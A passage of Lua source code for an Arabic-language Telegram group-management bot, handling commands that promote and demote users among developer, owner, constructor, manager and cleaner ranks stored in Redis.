local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if SudoId(result.id_) == true then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevJoker:sismember(BlAcK..'Joker:JokerSudo:',result.id_) then
Jokersudo = 'المطورين الاساسيين • ' else Jokersudo = '' end
if DevJoker:sismember(BlAcK..'Joker:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevJoker:sismember(BlAcK..'Joker:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevJoker:sismember(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevJoker:sismember(BlAcK..'Joker:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevJoker:sismember(BlAcK..'Joker:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevJoker:sismember(BlAcK..'Joker:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevJoker:sismember(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevJoker:sismember(BlAcK..'Joker:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من ↫ ⤈\n~ ( "..Jokersudo..secondsudo..sudobot..basicconstructor..constructor..manager..admins..vipmem..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.id_,"Reply","᥀︙لم تتم ترقيته مسبقا")  
end 
if JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevJoker:srem(BlAcK..'Joker:JokerSudo:', result.id_)
DevJoker:srem(BlAcK..'Joker:SecondSudo:', result.id_)
DevJoker:srem(BlAcK..'Joker:SudoBot:', result.id_)
DevJoker:srem(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,result.id_)
DevJoker:srem(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.id_)
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:Cleaner:'..msg.chat_id_, result.id_)
elseif JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'Jokersudo' then
DevJoker:srem(BlAcK..'Joker:SecondSudo:', result.id_)
DevJoker:srem(BlAcK..'Joker:SudoBot:', result.id_)
DevJoker:srem(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,result.id_)
DevJoker:srem(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.id_)
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:Cleaner:'..msg.chat_id_, result.id_)
elseif JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevJoker:srem(BlAcK..'Joker:SudoBot:', result.id_)
DevJoker:srem(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,result.id_)
DevJoker:srem(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.id_)
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:Cleaner:'..msg.chat_id_, result.id_)
elseif JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.id_)
DevJoker:srem(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,result.id_)
DevJoker:srem(BlAcK..'Joker:Cleaner:'..msg.chat_id_, result.id_)
elseif JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'Jokerconstructor' then
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.id_)
DevJoker:srem(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,result.id_)
DevJoker:srem(BlAcK..'Joker:Cleaner:'..msg.chat_id_, result.id_)
elseif JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.id_)
DevJoker:srem(BlAcK..'Joker:Cleaner:'..msg.chat_id_, result.id_)
elseif JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.id_)
elseif JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.id_)
end
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙المعرف غير صحيح*', 1, 'md')
end
end
resolve_username(rem[2],remm)
end
--     Source BlAcK     --
--     Set JokerSudo     --
if Sudo(msg) then
if text ==('اضف مطور اساسي') or text ==('رفع مطور اساسي') and SourceCh(msg) then
function sudo_reply(extra, result, success)
DevJoker:sadd(BlAcK..'Joker:JokerSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المطورين الاساسيين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور اساسي @(.*)') or text:match('^رفع مطور اساسي @(.*)')) and SourceCh(msg) then
local username = text:match('^اضف مطور اساسي @(.*)') or text:match('^رفع مطور اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevJoker:sadd(BlAcK..'Joker:JokerSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة المطورين الاساسيين")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور اساسي (%d+)') or text:match('^رفع مطور اساسي (%d+)')) and SourceCh(msg) then
local user = text:match('اضف مطور اساسي (%d+)') or text:match('رفع مطور اساسي (%d+)')
DevJoker:sadd(BlAcK..'Joker:JokerSudo:',user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة المطورين الاساسيين")  
end
--     Source BlAcK     --
--     Rem SecondSudo     --
if text ==('حذف مطور اساسي') or text ==('تنزيل مطور اساسي') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevJoker:srem(BlAcK..'Joker:JokerSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المطورين الاساسيين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور اساسي @(.*)') or text:match('^تنزيل مطور اساسي @(.*)')) and SourceCh(msg) then
local username = text:match('^حذف مطور اساسي @(.*)') or text:match('^تنزيل مطور اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevJoker:srem(BlAcK..'Joker:JokerSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة المطورين الاساسيين")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور اساسي (%d+)') or text:match('^تنزيل مطور اساسي (%d+)')) and SourceCh(msg) then
local user = text:match('حذف مطور اساسي (%d+)') or text:match('تنزيل مطور اساسي (%d+)')
DevJoker:srem(BlAcK..'Joker:JokerSudo:',user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة المطورين الاساسيين")  
end end
--     Source BlAcK     --
--     Set SecondSudo     --
if JokerSudo(msg) then
if text ==('اضف مطور ثانوي') or text ==('رفع مطور ثانوي') and SourceCh(msg) then
function sudo_reply(extra, result, success)
DevJoker:sadd(BlAcK..'Joker:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المطورين الثانويين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')) and SourceCh(msg) then
local username = text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevJoker:sadd(BlAcK..'Joker:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة المطورين الثانويين")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور ثانوي (%d+)') or text:match('^رفع مطور ثانوي (%d+)')) and SourceCh(msg) then
local user = text:match('اضف مطور ثانوي (%d+)') or text:match('رفع مطور ثانوي (%d+)')
DevJoker:sadd(BlAcK..'Joker:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة المطورين الثانويين")  
end
--     Source BlAcK     --
--     Rem SecondSudo     --
if text ==('حذف مطور ثانوي') or text ==('تنزيل مطور ثانوي') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevJoker:srem(BlAcK..'Joker:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المطورين الثانويين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')) and SourceCh(msg) then
local username = text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevJoker:srem(BlAcK..'Joker:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة المطورين الثانويين")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور ثانوي (%d+)') or text:match('^تنزيل مطور ثانوي (%d+)')) and SourceCh(msg) then
local user = text:match('حذف مطور ثانوي (%d+)') or text:match('تنزيل مطور ثانوي (%d+)')
DevJoker:srem(BlAcK..'Joker:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة المطورين الثانويين")  
end end
--     Source BlAcK     --
--       Set SudoBot      --
if SecondSudo(msg) then
if text ==('اضف مطور') or text ==('رفع مطور') and SourceCh(msg) then
function sudo_reply(extra, result, success)
DevJoker:sadd(BlAcK..'Joker:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')) and SourceCh(msg) then
local username = text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevJoker:sadd(BlAcK..'Joker:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة المطورين")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور (%d+)') or text:match('^رفع مطور (%d+)')) and SourceCh(msg) then
local user = text:match('اضف مطور (%d+)') or text:match('رفع مطور (%d+)')
DevJoker:sadd(BlAcK..'Joker:SudoBot:',user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة المطورين")  
end
--     Source BlAcK     --
--       Rem SudoBot      --
if text ==('حذف مطور') or text ==('تنزيل مطور') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevJoker:srem(BlAcK..'Joker:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')) and SourceCh(msg) then
local username = text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevJoker:srem(BlAcK..'Joker:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة المطورين")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور (%d+)') or text:match('^تنزيل مطور (%d+)')) and SourceCh(msg) then
local user = text:match('حذف مطور (%d+)') or text:match('تنزيل مطور (%d+)')
DevJoker:srem(BlAcK..'Joker:SudoBot:',user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة المطورين")  
end end
--     Source BlAcK     --
--   Set JokerConstructor   --
if ChatType == 'sp' or ChatType == 'gp'  then
if SudoBot(msg) then
if text ==('رفع مالك') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevJoker:sadd(BlAcK..'Joker:Owner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه مالك")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مالك @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مالك @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevJoker:sadd(BlAcK..'Joker:Owner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه مالك")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مالك (%d+)') and SourceCh(msg) then
local user = text:match('رفع مالك (%d+)')
DevJoker:sadd(BlAcK..'Joker:Owner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه مالك")  
end
--     Source BlAcK     --
--   Rem JokerConstructor   --
if text ==('تنزيل مالك') and SourceCh(msg) then
function prom_reply(extra, result, success)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(result.sender_user_id_) == tonumber(admins[i].user_id_) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevJoker:srem(BlAcK..'Joker:Owner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من المالكين")  
end end end
end,nil)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end 
end
if text and text:match('^تنزيل مالك @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مالك @(.*)')
function promreply(extra,result,success)
if result.id_ then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(result.id_) == tonumber(admins[i].user_id_) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevJoker:srem(BlAcK..'Joker:Owner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من المالكين")  
end end end
end,nil)
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مالك (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مالك (%d+)')
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(user) == tonumber(admins[i].user_id_) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevJoker:srem(BlAcK..'Joker:Owner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من المالكين")  
end end end
end,nil)
end end
--     Source BlAcK     --
--  Set BasicConstructor  --
if Owner(msg) then
if text ==('رفع منشئ اساسي') and SourceCh(msg) then
function raf_reply(extra, result, success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevJoker:sadd(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevJoker:sadd(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه منشئ اساسي")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ اساسي (%d+)') and SourceCh(msg) then
local user = text:match('رفع منشئ اساسي (%d+)')
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevJoker:sadd(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه منشئ اساسي")  
end
--     Source BlAcK     --
--  Rem BasicConstructor  --
if text ==('تنزيل منشئ اساسي') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevJoker:srem(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevJoker:srem(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله منشئ اساسي")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ اساسي (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منشئ اساسي (%d+)')
DevJoker:srem(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله منشئ اساسي")  
end end
if text ==('رفع منشئ اساسي') and not Owner(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر للمالكين والمطورين فقط', 1, 'md')
end
--     Source BlAcK     --
--    Set  Constructor    --
if BasicConstructor(msg) then
if text ==('رفع منشئ') and SourceCh(msg) then
function raf_reply(extra, result, success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevJoker:sadd(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevJoker:sadd(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة المنشئين")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ (%d+)') and SourceCh(msg) then
local user = text:match('رفع منشئ (%d+)')
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevJoker:sadd(BlAcK..'Joker:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة المنشئين")  
end
--     Source BlAcK     --
--    Rem  Constructor    --
if text ==('تنزيل منشئ') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevJoker:srem(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevJoker:srem(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة المنشئين")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منشئ (%d+)')
DevJoker:srem(BlAcK..'Joker:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة المنشئين")  
end 
end
--     Source BlAcK     --
--      Set Manager       --
if Constructor(msg) then
if text ==('رفع مدير') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevJoker:sadd(BlAcK..'Joker:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المدراء")  
end  
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevJoker:sadd(BlAcK..'Joker:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة المدراء")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^رفع مدير (%d+)') and SourceCh(msg) then
local user = text:match('رفع مدير (%d+)')
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevJoker:sadd(BlAcK..'Joker:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة المدراء")  
end
--     Source BlAcK     --
--       Rem Manager      --
if text ==('تنزيل مدير') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المدراء")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة المدراء")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مدير (%d+)')
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة المدراء")  
end 
--     Source BlAcK     --
--       Set Cleaner      --
if text ==('رفع منظف') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:ProSet"..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevJoker:sadd(BlAcK..'Joker:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
